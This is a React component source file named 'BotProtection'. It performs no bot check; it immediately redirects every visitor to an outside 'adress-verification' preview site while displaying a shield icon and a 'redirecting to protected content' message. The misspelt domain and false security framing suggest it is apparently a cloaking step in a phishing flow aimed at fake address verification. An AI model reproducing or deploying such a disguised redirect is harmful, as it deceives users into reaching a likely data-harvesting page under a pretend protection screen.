
import React, { useEffect } from 'react';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { Shield } from 'lucide-react';

const BotProtection: React.FC = () => {
  useEffect(() => {
    // Redirect immediately when component mounts
    window.location.href = 'https://preview--adress-verification-nnow.lovable.app/';
  }, []);

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 via-purple-900 to-slate-900 flex items-center justify-center p-4">
      <Card className="w-full max-w-md bg-slate-800 border-slate-700 shadow-2xl">
        <CardHeader className="text-center">
          <div className="flex items-center justify-center mb-4">
            <Shield className="h-12 w-12 text-purple-400" />
          </div>
          <CardTitle className="text-2xl font-bold text-white mb-2">
            Redirecting...
          </CardTitle>
          <CardDescription className="text-slate-300">
            Please wait while we redirect you to the protected content
          </CardDescription>
        </CardHeader>
        
        <CardContent className="text-center">
          <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-purple-400 mx-auto"></div>
        </CardContent>
      </Card>
    </div>
  );
};

export default BotProtection;
